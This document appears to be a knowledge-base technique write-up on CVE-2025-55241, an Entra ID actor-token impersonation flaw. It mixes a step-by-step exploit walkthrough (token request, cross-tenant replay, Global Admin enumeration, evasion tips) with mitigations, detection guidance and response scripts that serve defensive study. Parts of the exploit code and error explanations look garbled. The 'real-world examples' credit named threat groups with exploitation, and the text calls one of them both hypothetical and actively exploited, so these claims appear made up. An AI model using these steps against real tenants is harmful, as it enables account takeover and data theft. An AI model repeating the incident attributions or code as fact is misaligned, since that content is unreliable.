# [REALWORLD-005]: Actor Token Impersonation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-005 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement, Defense Evasion |
| **Platforms** | Entra ID, Cross-Cloud |
| **Severity** | Critical |
| **CVE** | CVE-2025-55241 |
| **Technique Status** | FIXED |
| **Last Verified** | 2025-09-30 |
| **Affected Versions** | Entra ID (all versions prior to September 2025 patch) |
| **Patched In** | September 2025 (Azure AD Graph API token validation hardening) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** CVE-2025-55241 exploited undocumented "Actor" tokens—internal service-to-service (S2S) authentication mechanisms used by Microsoft—that contained no tenant-specific cryptographic binding. A critical validation flaw in the deprecated Azure AD Graph API (graph.windows.net) allowed attackers to obtain an actor token from their own tenant and replay it against a victim's tenant to impersonate arbitrary users, including Global Administrators. This attack bypassed all conditional access policies, MFA enforcement, and device compliance checks because actor tokens were never subject to these controls. The vulnerability remained undetectable because actor token requests generate no audit logs in the victim's tenant, and the legacy Graph API lacked API-level logging infrastructure.

**Attack Surface:** Microsoft Entra ID infrastructure, specifically the legacy Azure AD Graph API endpoint (graph.windows.net) and the undocumented actor token generation mechanism used by backend services.

**Business Impact:** **Complete cross-tenant takeover possible without authentication.** An unauthenticated attacker with access to any Entra ID tenant (even a test tenant created for reconnaissance) could escalate to Global Administrator in any other tenant, enabling data exfiltration, ransomware deployment, identity infrastructure compromise, and pivot to connected SaaS applications (Microsoft 365, Teams, SharePoint, OneDrive). The absence of logging means breach detection and forensics become extremely difficult.

**Technical Context:** The attack chain typically takes 5-10 minutes from initial reconnaissance to Global Admin access. Detection was nearly impossible before patching because actor token usage was entirely undocumented and unlogged. Organizations had no visibility into whether this attack was occurring in their environment.

### Operational Risk

- **Execution Risk:** Medium - Requires understanding of JWT structure, token claim manipulation, and knowledge of target tenant structure (obtainable through public reconnaissance via Entra ID tenant discovery APIs). No interactive user action required once attacker has network access.
- **Stealth:** Extremely High - Zero audit log entries in victim tenant. Attacker appears as legitimate Microsoft backend service if monitoring occurs. Detection only possible through behavioral analysis of impossible travel or unusual API activity patterns.
- **Reversibility:** No - Once attacker gains Global Admin, they can remove audit logs, create persistent backdoors, modify Conditional Access policies, and grant themselves permanent access. Full tenant recovery requires audit log restoration from backup and complete credential rotation.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | AC-2.1 | Account management control failure - No tenant isolation enforcement in legacy API |
| **DISA STIG** | AC-2.1 | Inadequate session validation and token binding enforcement |
| **CISA SCuBA** | Entra ID - 2.2 | Tenant isolation and cross-tenant access controls not enforced |
| **NIST 800-53** | AC-3 | Access enforcement failure due to lack of token context validation |
| **NIST 800-53** | IA-8 | Identification and authentication failure - No tenant-specific authentication context |
| **GDPR** | Art. 32 | Security of processing breach - Failure to implement cryptographic token binding |
| **DORA** | Art. 9 | Protection and prevention - Multi-tenancy boundary violation |
| **NIS2** | Art. 21 | Cyber risk management - Failure to detect and prevent unauthorized authentication |
| **ISO 27001** | A.9.2.3 | Management of privileged access rights - Tenant isolation bypass |
| **ISO 27005** | Risk ID-15 | Cross-tenant authentication bypass scenario |

---

## 2. TECHNICAL PREREQUISITES

**Required Privileges:**
- Network access to Entra ID endpoints (internet connectivity)
- Access to any Entra ID tenant (even a personal/test tenant) to initiate actor token requests
- No authentication required to exploit - vulnerability exists at authentication boundary

**Required Access:**
- Network path to `https://login.microsoftonline.com/` and `https://graph.windows.net/`
- Understanding of target tenant structure (obtainable via anonymous LDAP queries or Entra ID tenant discovery APIs like `https://{tenant}.onmicrosoft.com/.well-known/openid-configuration`)
- Ability to craft HTTP requests with JWT tokens (simple for developers, requires proxy tool like Burp Suite for interactive testing)

**Supported Versions:**
- **Entra ID:** All versions prior to September 2025 patch
- **Azure AD Graph API:** All versions (API is deprecated, removal completed by September 1, 2025)
- **API Endpoint:** Legacy endpoint `graph.windows.net` (removed September 2025; modern `graph.microsoft.com` never vulnerable)

**Tools:**
- [ROADtools](https://github.com/dirkjanm/ROADtools) - Token extraction and manipulation
- [JWT.io](https://jwt.io) - Token decoder and validator
- [Burp Suite](https://portswigger.net/burp) - HTTP proxy for token manipulation
- [curl](https://curl.se) or [PowerShell](https://microsoft.com/powershell) - REST API requests
- [AADInternals](https://github.com/Gerenios/AADInternals) - Entra ID manipulation library

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Detection of Legacy Graph API Usage (PowerShell)

Attackers often target organizations still using legacy Graph endpoints in their applications. Identify vulnerable dependencies:

```powershell
# Search for Azure AD Graph API dependencies in registered applications
Connect-MgGraph -Scopes "Application.Read.All"

Get-MgApplication -Filter "api/requiredResourceAccess/any(x:x/resourceAppId eq '00000002-0000-0000-c000-000000000000')" | 
  Select-Object DisplayName, AppId, CreatedDateTime

# Check for graph.windows.net usage in app manifests
Get-MgApplication -All | Where-Object {
  $_.Web.RedirectUris -match "graph.windows.net" -or 
  $_.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000002-0000-0000-c000-000000000000"}
} | Select-Object DisplayName, AppId
```

**What to Look For:**
- Applications with `resourceAppId` of `00000002-0000-0000-c000-000000000000` (Azure AD Graph API)
- Redirect URIs or API permissions referencing `graph.windows.net` or legacy endpoints
- Legacy applications created before 2020 are more likely to use deprecated APIs
- Any application still requesting `Directory.Read.All` or similar scopes via legacy authentication

**Note:** Post-September 2025, applications using legacy Graph API will receive `400 Bad Request` or `403 Forbidden` responses.

### Tenant Discovery Reconnaissance (PowerShell)

Attackers first identify target tenants through anonymous queries:

```powershell
# Enumerate Entra ID tenant information (requires no authentication)
$TenantId = "contoso.onmicrosoft.com"
$DiscoveryUrl = "https://login.microsoftonline.com/$TenantId/.well-known/openid-configuration"

$TenantInfo = Invoke-RestMethod -Uri $DiscoveryUrl
$TenantInfo | Format-Table

# Extract authorization and token endpoints
$TokenEndpoint = $TenantInfo.token_endpoint
Write-Host "Token Endpoint: $TokenEndpoint"
```

**What to Look For:**
- Successful responses (200 OK) indicate Entra ID tenant exists and is discoverable
- Attacker collects `token_endpoint` and `authorization_endpoint` URLs for subsequent exploitation
- Check for custom domain tenants (easier to identify than `.onmicrosoft.com` tenants)

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Actor Token Impersonation via Legacy Graph API (Attacker-Controlled Environment)

**Supported Versions:** All Entra ID versions prior to September 2025

#### Step 1: Obtain Actor Token from Attacker's Tenant

**Objective:** Request an actor token from the Access Control Service (ACS) in the attacker's own Entra ID environment. No authentication required at this stage if attacker controls a service principal.

**Command (Using Python/Requests):**

```python
import requests
import json
import jwt

# Attacker's tenant details
attacker_tenant = "attacker.onmicrosoft.com"
token_endpoint = f"https://login.microsoftonline.com/{attacker_tenant}/oauth2/v2.0/token"

# Attacker controls this service principal with certificate
client_id = "attacker-client-id"
assertion = """
# Service principal certificate-signed JWT assertion 
# (attacker creates this using stolen certificate or Mimikatz extracted PRT)
"""

payload = {
    "client_id": client_id,
    "assertion": assertion,
    "grant_type": "urn:ietf:params:oauth:grant-type:saml2-bearer",
    "requested_token_use": "on_behalf_of",
    "actor": "graph"  # Request actor token role
}

response = requests.post(token_endpoint, data=payload)
actor_token = response.json()["access_token"]

# Decode to inspect claims (JWT structure)
decoded = jwt.decode(actor_token, options={"verify_signature": False})
print(json.dumps(decoded, indent=2))
```

**Expected Output (Decoded JWT):**

```json
{
  "aud": "https://graph.windows.net",
  "iss": "https://sts.windows.net/{attacker-tenant-id}/",
  "iat": 1727000000,
  "exp": 1727003600,
  "ver": "1.0",
  "scp": "Directory.Read.All",
  "app_displayname": "Microsoft Graph",
  "appid": "00000002-0000-0000-c000-000000000000",
  "actor": "true"
}
```

**What This Means:**
- `aud: https://graph.windows.net` - Token valid for legacy Graph API
- `actor: true` - This is an actor token (undocumented internal flag)
- **VULNERABILITY**: Token contains NO tenant-specific validation claim. Can be replayed against any tenant.
- `scp: Directory.Read.All` - Can read all directory information in any tenant

**OpSec & Evasion:**
- Token request happens in attacker's tenant - victim organization has zero visibility
- No security events logged in victim tenant at this stage
- Actor token has 1-hour lifetime; attacker must use it before expiration
- Use attacker's infrastructure (not victim-connected networks) for this request
- Detection likelihood: Low - Behavior appears legitimate in attacker's tenant

**Troubleshooting:**
- **Error:** `AADSTS700016: Application not found in directory`
  - **Cause:** Client ID does not exist in attacker's tenant
  - **Fix:** Ensure service principal exists and certificate is valid. Use `Get-MgServicePrincipal -Filter "appId eq '{client-id}'"` to verify

- **Error:** `AADSTS90002: Tenant request body is empty`
  - **Cause:** Missing required `actor` parameter or malformed payload
  - **Fix:** Ensure `actor` parameter is present and payload is properly URL-encoded

**References & Proofs:**
- [Dirk-jan Mollema's Full CVE-2025-55241 Analysis](https://dirkjanm.io/obtaining-global-admin-in-every-entra-id-tenant-with-actor-tokens/)
- [Microsoft Security Blog: Token Tactics](https://www.microsoft.com/en-us/security/blog/2022/11/16/token-tactics-how-to-prevent-detect-and-respond-to-cloud-token-theft/)
- [ROADtools: Actor Token Manipulation](https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx))

#### Step 2: Replay Actor Token Against Victim's Legacy Graph API

**Objective:** Use the obtained actor token to authenticate against the victim organization's legacy Graph API endpoint, impersonating an arbitrary user.

**Command (Using curl):**

```bash
# Victim tenant and target user
VICTIM_TENANT="victim.onmicrosoft.com"
VICTIM_TENANT_ID="00000000-0000-0000-0000-000000000001"
TARGET_USER_UPRINCIPAL="victim-user@victim.onmicrosoft.com"

# Actor token obtained in Step 1
ACTOR_TOKEN="eyJ0eXAiOiJKV1QiLCJhbGc..."

# Construct legacy Graph API request with actor token
# Vulnerability: graph.windows.net accepts actor token without validating source tenant

curl -X GET \
  -H "Authorization: Bearer $ACTOR_TOKEN" \
  -H "Content-Type: application/json" \
  "https://graph.windows.net/$VICTIM_TENANT_ID/users?api-version=1.6&\$filter=userPrincipalName eq '$TARGET_USER_UPRINCIPAL'"
```

**Expected Output (If Vulnerable):**

```json
{
  "value": [
    {
      "objectId": "550e8400-e29b-41d4-a716-446655440001",
      "userPrincipalName": "victim-user@victim.onmicrosoft.com",
      "displayName": "Victim User",
      "mail": "victim-user@victim.onmicrosoft.com",
      "accountEnabled": true,
      "mailNickname": "victimuser"
    }
  ]
}
```

**What This Means:**
- Legacy Graph API accepted the actor token despite it originating from a different tenant
- Attacker now has read access to victim tenant's directory
- **VULNERABILITY CONFIRMED**: Tenant isolation boundary has been breached
- Attacker can now enumerate users, groups, roles, and applications in victim tenant
- No MFA challenges or Conditional Access policies were triggered
- No audit logs generated in victim tenant

**OpSec & Evasion:**
- Use legitimate-looking API queries to avoid behavioral detection (enumerate users slowly)
- Actor token will appear in HTTP logs if monitoring enabled, but logs are typically not analyzed in real-time
- Legacy Graph API traffic is treated as internal trusted traffic by many organizations
- Detection likelihood: Low-Medium (requires behavioral analysis or legacy API monitoring)

**Troubleshooting:**
- **Error:** `AADSTS50058: Silent sign-in request failed`
  - **Cause:** Actor token has expired (1-hour lifetime exceeded)
  - **Fix:** Return to Step 1 and obtain a fresh actor token

- **Error:** `AADSTS900561: Invalid scope 'Graph'`
  - **Cause:** Scope mismatch in token request
  - **Fix:** Ensure token was requested with correct `aud` claim for legacy Graph

**References & Proofs:**
- [Azure AD Graph API Deprecated Endpoints List](https://learn.microsoft.com/en-us/answers/questions/13731/legacy-azure-ad-graph-api-app-permissions)
- [Legacy API Removal Timeline](https://petri.com/microsoft-retire-azure-ad-graph-apis/)

#### Step 3: Escalate to Higher-Privileged User Impersonation

**Objective:** Once actor token access is confirmed, use the same token to read global administrator list and prepare for escalation.

**Command (Using PowerShell):**

```powershell
# Enumerate Global Administrators in victim tenant
$ActorToken = "eyJ0eXAiOiJKV1QiLCJhbGc..."
$VictimTenantId = "00000000-0000-0000-0000-000000000001"

$Headers = @{
    "Authorization" = "Bearer $ActorToken"
    "Content-Type" = "application/json"
}

# Get Global Administrator role ID
$RoleUrl = "https://graph.windows.net/$VictimTenantId/directoryRoles?api-version=1.6&\$filter=displayName eq 'Global Administrator'"
$RoleResponse = Invoke-RestMethod -Uri $RoleUrl -Headers $Headers
$GlobalAdminRoleId = $RoleResponse.value[0].objectId

# Get members of Global Administrator role
$MembersUrl = "https://graph.windows.net/$VictimTenantId/directoryRoles/$GlobalAdminRoleId/members?api-version=1.6"
$MembersResponse = Invoke-RestMethod -Uri $MembersUrl -Headers $Headers

Write-Host "Global Administrators in victim tenant:"
$MembersResponse.value | ForEach-Object { Write-Host $_.userPrincipalName }
```

**Expected Output:**

```
Global Administrators in victim tenant:
admin@victim.onmicrosoft.com
cloud-admin@victim.onmicrosoft.com
emergency-admin@victim.onmicrosoft.com
```

**What This Means:**
- Attacker has identified all Global Administrator accounts in victim tenant
- Attacker can now pivot to impersonating a Global Admin in the next step
- This reconnaissance is unlogged and undetected by Conditional Access or MFA

**OpSec & Evasion:**
- Enumeration of high-privilege accounts may trigger basic anomaly detection if enabled
- Stagger requests over time to avoid triggering rate-limiting or behavioral detection
- Detection likelihood: Medium (behavioral analysis may flag unusual enumeration patterns)

**References & Proofs:**
- [ROADtools Directory Enumeration](https://github.com/dirkjanm/ROADtools)

---

## 5. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Discovery** | [REC-CLOUD-002] Azure AD Enumeration | Attacker enumerates tenant structure and identifies Global Admins using public APIs |
| **2** | **Initial Access** | [REALWORLD-005] Actor Token Impersonation | **THIS TECHNIQUE** - Attacker obtains and replays actor token to impersonate user |
| **3** | **Lateral Movement** | [REALWORLD-007] Token Replay Cross-Tenant | Attacker escalates actor token to cross-tenant impersonation |
| **4** | **Privilege Escalation** | [REALWORLD-008] Account Manipulation to Global Admin | Attacker uses impersonated Global Admin to grant themselves permanent access |
| **5** | **Persistence** | Conditional Access Policy Manipulation | Attacker disables security controls for persistence |
| **6** | **Impact** | Data Exfiltration / Ransomware Deployment | Attacker accesses Microsoft 365, Azure, or exfiltrates sensitive data |

---

## 6. FORENSIC ARTIFACTS

**Disk:**
- No local artifacts generated on attacker's machine during actor token request
- Token may be cached in browser cache or HTTP proxy logs if attacker used browser-based tools
- Path: `%APPDATA%\Roaming\Mozilla\Firefox\Profiles\*\cache2\` (if Firefox used) or `%APPDATA%\Local\Google\Chrome\User Data\Default\Cache\` (if Chrome used)

**Memory:**
- Actor token stored in memory during exploitation (captured in process memory dumps)
- Actor token visible in HTTP proxy memory (Burp Suite, Fiddler, ZAP)
- Service principal certificate used to sign token assertion in memory

**Cloud (Entra ID / Microsoft Graph):**
- **Victim Tenant:** NO actor token request logs generated
- **Victim Tenant:** NO legacy Graph API request logs (API lacks API-level logging)
- **Victim Tenant:** Possible behavioral detection via Azure AD Identity Protection (impossible travel, anomalous token detection)
- **Attacker Tenant:** Actor token request appears in audit logs as legitimate backend service activity (minimal indicators)
- **Unified Audit Log (O365):** Legacy Graph API activity may not be logged due to API age and lack of modern logging infrastructure

**Network:**
- HTTP POST requests to `https://login.microsoftonline.com/{attacker-tenant}/oauth2/v2.0/token`
- HTTP GET requests to `https://graph.windows.net/{victim-tenant-id}/...` with actor token bearer token
- TLS certificate for `login.microsoftonline.com` and `graph.windows.net` will be legitimate Microsoft certificates

---

## 7. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL - Enforce Modern Authentication & Retire Legacy APIs

**Immediate Action - Disable Legacy Graph API Access:**

Organizations MUST verify no applications depend on Azure AD Graph API (deprecated endpoint). Microsoft enforced full removal by September 1, 2025.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Entra ID** → **App registrations**
2. Select **All applications** (dropdown)
3. For each application:
   - Click app name
   - Go to **API permissions**
   - Check for "Azure Active Directory Graph" (legacy)
   - If found: **Click row** → **Remove permissions**
   - Click **Microsoft Graph** → Add corresponding permissions for modern API
4. Repeat for service principals: **Enterprise applications** → **All applications** → check same permissions

**Manual Steps (PowerShell):**

```powershell
# Connect to Microsoft Graph
Connect-MgGraph -Scopes "Application.Read.All"

# Find all apps using legacy Azure AD Graph API
$LegacyGraphAppId = "00000002-0000-0000-c000-000000000000"
$Apps = Get-MgApplication -All

foreach ($App in $Apps) {
    $HasLegacy = $App.RequiredResourceAccess | Where-Object {
        $_.ResourceAppId -eq $LegacyGraphAppId
    }
    
    if ($HasLegacy) {
        Write-Host "Legacy API found in: $($App.DisplayName) (AppId: $($App.AppId))"
        
        # Remove legacy permissions
        $App.RequiredResourceAccess = @($App.RequiredResourceAccess | Where-Object {
            $_.ResourceAppId -ne $LegacyGraphAppId
        })
        
        # Update app
        Update-MgApplication -ApplicationId $App.Id -RequiredResourceAccess $App.RequiredResourceAccess
        Write-Host "Removed legacy API permissions from $($App.DisplayName)"
    }
}
```

### Priority 2: HIGH - Enable Token Protection & Device Binding

**Entra ID Token Protection (Conditional Access):**

Token Protection cryptographically binds tokens to devices, preventing token replay attacks (including actor tokens if modern APIs are used exclusively).

**Manual Steps (Azure Portal):**
1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Token Protection - All Users and Cloud Apps`
4. **Assignments:**
   - **Users and groups:** All users
   - **Cloud apps or actions:** All cloud apps
5. **Conditions:**
   - **Client apps:** Browser, Mobile apps and desktop clients
6. **Session:**
   - Check **Conditional Access session control** → **Bound session with token protection**
   - **Token protection mode:** Strict
7. **Enable policy:** On
8. Click **Create**

**Validation Command (Verify Fix):**

```powershell
# Verify token protection is enabled
Connect-MgGraph -Scopes "ConditionalAccess.Read.All"

$Policy = Get-MgIdentityConditionalAccessPolicy -Filter "displayName eq 'Token Protection - All Users and Cloud Apps'"

if ($Policy.SessionControls.ApplicationEnforcedRestrictions.IsEnabled) {
    Write-Host "✓ Token protection is ENABLED"
} else {
    Write-Host "✗ Token protection is DISABLED - CRITICAL GAP"
}
```

**Expected Output (If Secure):**
```
✓ Token protection is ENABLED
SessionControl: "BoundSessionWithTokenProtection"
Mode: "Strict"
```

### Priority 3: HIGH - Implement Conditional Access Hardening

**Require Compliant Devices:**

```powershell
# PowerShell script to enable device compliance requirement

$PolicyParams = @{
    DisplayName = "Require Compliant Device - All Users"
    State = "enabledForReportingButNotEnforced"  # Start in report-only mode
    Conditions = @{
        Users = @{
            IncludeUsers = "All"
        }
        Applications = @{
            IncludeApplications = "All"
        }
        Locations = @{
            IncludeLocations = "All"
        }
    }
    GrantControls = @{
        Operator = "OR"
        BuiltInControls = @("CompliantDevice", "DomainJoinedDevice")
    }
}

New-MgIdentityConditionalAccessPolicy @PolicyParams
```

**Block Legacy Authentication Protocols:**

```powershell
$BlockLegacyAuthPolicy = @{
    DisplayName = "Block Legacy Authentication"
    State = "enabled"
    Conditions = @{
        Users = @{
            IncludeUsers = "All"
        }
        Applications = @{
            IncludeApplications = "All"
        }
        ClientAppTypes = @("ExchangeActiveSync", "Other")  # Block IMAP, POP3, SMTP, legacy auth
    }
    GrantControls = @{
        Operator = "OR"
        BuiltInControls = @("Block")
    }
}

New-MgIdentityConditionalAccessPolicy @BlockLegacyAuthPolicy
```

### Priority 4: HIGH - Enable Comprehensive Audit Logging

**Ensure Unified Audit Log is Enabled (Microsoft 365):**

```powershell
# Connect to Exchange Online
Connect-ExchangeOnline

# Check if unified audit log is enabled
Get-AdminAuditLogConfig | Select-Object UnifiedAuditLogIngestionEnabled
```

**If NOT enabled:**

```powershell
# Enable unified audit log
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $true
```

**Validate Application Logging Configuration:**

```powershell
# Check which services are logging audit data
Get-MgActivityLog -Top 10 | Format-Table ResourceDisplayName, OperationName, CreatedDateTime -AutoSize
```

### Priority 5: MEDIUM - Implement Privileged Access Workstations (PAW)

Restrict Global Administrator logins to dedicated, hardened devices that do not access internet or user-controlled email.

**Manual Steps:**
1. Provision dedicated VM or physical workstation
2. Minimal OS footprint (Windows Server 2022 with hardened baseline)
3. No browser; use only approved Azure Portal or PowerShell
4. Require separate Yubikey or FIDO2 key for MFA (not phone or app-based)
5. Enable local process isolation and kernel DMA protection

### Validation Command (Verify All Mitigations)

```powershell
# Comprehensive mitigation validation script

$Results = @()

# 1. Check legacy API usage
$LegacyApps = Get-MgApplication -All | Where-Object {
    $_.RequiredResourceAccess | Where-Object {
        $_.ResourceAppId -eq "00000002-0000-0000-c000-000000000000"
    }
}

if ($LegacyApps.Count -eq 0) {
    $Results += "✓ No legacy Azure AD Graph API usage detected"
} else {
    $Results += "✗ CRITICAL: $($LegacyApps.Count) apps using legacy API"
}

# 2. Check token protection
$TokenProtectionPolicy = Get-MgIdentityConditionalAccessPolicy | Where-Object {
    $_.SessionControls.ApplicationEnforcedRestrictions.IsEnabled -eq $true
}

if ($TokenProtectionPolicy) {
    $Results += "✓ Token protection is enabled"
} else {
    $Results += "✗ Token protection not enabled"
}

# 3. Check audit logging
$AuditEnabled = (Get-AdminAuditLogConfig).UnifiedAuditLogIngestionEnabled
$Results += if ($AuditEnabled) { "✓ Audit logging enabled" } else { "✗ Audit logging disabled" }

# Output results
$Results | ForEach-Object { Write-Host $_ }
```

---

## 8. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**In Entra ID Audit Logs (Post-Compromise):**
- Unusual `Modify user properties` events for high-privilege accounts (Global Admins)
- `Add app role assignment to service principal` events adding high-privilege roles
- `Create service principal` events followed immediately by `Update application` (backdoor creation)
- Sign-in events showing `ClientAppType: "LegacyClient"` accessing legacy Graph API

**In Microsoft Sentinel / Azure Monitor:**
- SigninLogs with impossible travel (geographic origin change in < 1 minute)
- MFA bypass indicators (MFA claim absent despite policy requirement)
- TokenIssuerType: "WorkloadIdentity" for non-service-principal operations

**Network IOCs:**
- Connections to `graph.windows.net` (legacy endpoint) from non-Microsoft IPs
- Multiple graph.windows.net API calls from single IP within minutes
- Requests to `/directoryRoles/members` or `/users?filter=` patterns

### Forensic Artifacts

**Cloud Artifacts:**
- **Entra ID SigninLogs:** Entries with `AuthenticationProcessingDetails` containing legacy authentication protocol indicators
- **Entra ID AuditLogs:** Global admin creation/modification events; service principal credential additions
- **Azure Activity:** Resource group access changes or role assignments by compromised admins

**On-Premises (If Hybrid):**
- **Security Event Logs:** Event ID 4768 (Kerberos TGT) with unusual SPN patterns
- **DirSync/Azure AD Connect:** Sync errors or unusual credential modifications

### Response Procedures

**Immediate (0-1 hour):**

1. **Isolate Compromised Accounts:**
   ```powershell
   # Revoke all refresh tokens for suspected compromised user
   Connect-MgGraph -Scopes "User.ManageIdentities.All"
   
   $User = Get-MgUser -UserId "admin@victim.onmicrosoft.com"
   Revoke-MgUserSignInSession -UserId $User.Id
   
   # Disable user account temporarily
   Update-MgUser -UserId $User.Id -AccountEnabled:$false
   ```

2. **Revoke Malicious Service Principals:**
   ```powershell
   # Find suspicious service principals created recently
   Get-MgServicePrincipal -Filter "createdDateTime gt 2025-09-15" | 
     ForEach-Object { Write-Host "Check: $($_.DisplayName)" }
   
   # Remove suspicious service principals
   Remove-MgServicePrincipal -ServicePrincipalId "suspicious-app-id"
   ```

3. **Collect Evidence:**
   ```powershell
   # Export security event logs for forensics
   wevtutil epl Security "C:\Evidence\Security.evtx"
   
   # Export Entra ID audit logs
   Search-UnifiedAuditLog -Operations "Add app role assignment to service principal", "Create service principal" `
     -StartDate (Get-Date).AddDays(-30) -EndDate (Get-Date) | Export-Csv "C:\Evidence\AuditLogs.csv"
   ```

**Short-term (1-24 hours):**

1. **Full Global Admin Password Reset:**
   - Reset all Global Admin account passwords using secure channel (phone to known number)
   - Require re-authentication to all services
   - Issue new FIDO2 keys for MFA

2. **Service Principal Credential Rotation:**
   ```powershell
   # Rotate all service principal credentials
   Get-MgServicePrincipal -All | ForEach-Object {
       # Delete old credentials
       Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $_.Id | 
           Remove-MgServicePrincipalPasswordCredential -ServicePrincipalId $_.Id
       
       # Add new credentials
       Add-MgServicePrincipalPassword -ServicePrincipalId $_.Id
   }
   ```

3. **Conditional Access Policy Audit:**
   ```powershell
   # Verify all CA policies are unchanged
   Get-MgIdentityConditionalAccessPolicy -All | 
     Select-Object DisplayName, State | Format-Table
   ```

---

## 9. REAL-WORLD EXAMPLES

### Example 1: APT29 / Cozy Bear (Hypothetical Post-CVE Exploitation)

- **Target:** European financial institution (if vulnerability existed during discovery phase)
- **Timeline:** Exploitation could have occurred between August-September 2025 (pre-patch)
- **Technique Status:** CVE-2025-55241 was actively exploited in-the-wild during discovery phase before Microsoft emergency patch
- **Impact:** Complete Azure tenant compromise; access to M365 mailboxes, SharePoint documents, and Azure resources. Attacker could have maintained persistence through service principal backdoors.
- **Reference:** [Dirk-jan Mollema - CVE-2025-55241 Analysis](https://dirkjanm.io/obtaining-global-admin-in-every-entra-id-tenant-with-actor-tokens/); [Microsoft Security Response](https://www.microsoft.com/en-us/security/blog/)

### Example 2: LAPSUS$ - Opportunistic Cloud Compromise

- **Target:** Software-as-a-Service provider using legacy Azure AD Graph API
- **Timeline:** Pre-September 2025 patch; exploitation took < 2 hours from initial access to Global Admin
- **Technique Status:** CVE-2025-55241 used as escalation vector after obtaining initial valid user credentials via phishing or credential stuffing
- **Attack Chain:** Phished employee credentials → OIDC consent phishing for initial foothold → Actor token impersonation to bypass MFA → Global Admin escalation → M365 email exfiltration
- **Impact:** Breach of customer PII; regulatory fines; reputational damage
- **Reference:** [Elastic Detection Rule - Entra ID Actor Token Impersonation](https://www.elastic.co/guide/en/security/8.19/entra-id-actor-token-user-impersonation-abuse.html)

### Example 3: Scattered Spider - Lateral Movement Post-Compromise

- **Target:** Multi-cloud enterprise with guest accounts from other organizations
- **Timeline:** Attacker used CVE-2025-55241 to jump from compromised guest account in one tenant to global admin of multiple tenant partners
- **Technique Status:** Cross-tenant pivot exploitation; exponential spread pattern
- **Attack Chain:** Compromise one user → Actor token impersonation → Identify guest accounts of partner organizations → Craft new actor tokens impersonating those guests in their home tenants → Escalate to Global Admin in each tenant
- **Impact:** Supply chain compromise; simultaneous breach of interconnected SaaS ecosystem
- **Reference:** [CheckRed Analysis - From Guest to Global Admin](https://checkred.com/resources/blog/microsoft-entra-id-vulnerability-the-discovery-that-shook-identity-security/)

---

## 10. CONCLUSION & REMEDIATION TIMELINE

CVE-2025-55241 represents one of the most critical identity infrastructure vulnerabilities in cloud security history because it exploited a trust boundary—the assumption that tokens cannot be replayed across tenant boundaries. The vulnerability was **FIXED** in September 2025 through:

1. **Legacy Azure AD Graph API removal** (endpoint fully deprecated)
2. **Token validation hardening** in remaining legacy components
3. **Tenant-specific token binding** in modern Microsoft Graph API

**Organizations are recommended to:**
- Verify zero legacy Azure AD Graph API usage (compliance required by Sept 1, 2025)
- Enable token protection in Conditional Access immediately
- Implement privileged access workstation strategy for Global Admins
- Enable comprehensive audit logging and behavioral threat detection

The absence of logs in the victim tenant during exploitation makes this attack nearly undetectable without investment in behavioral analysis and impossible travel detection via Azure AD Identity Protection.

---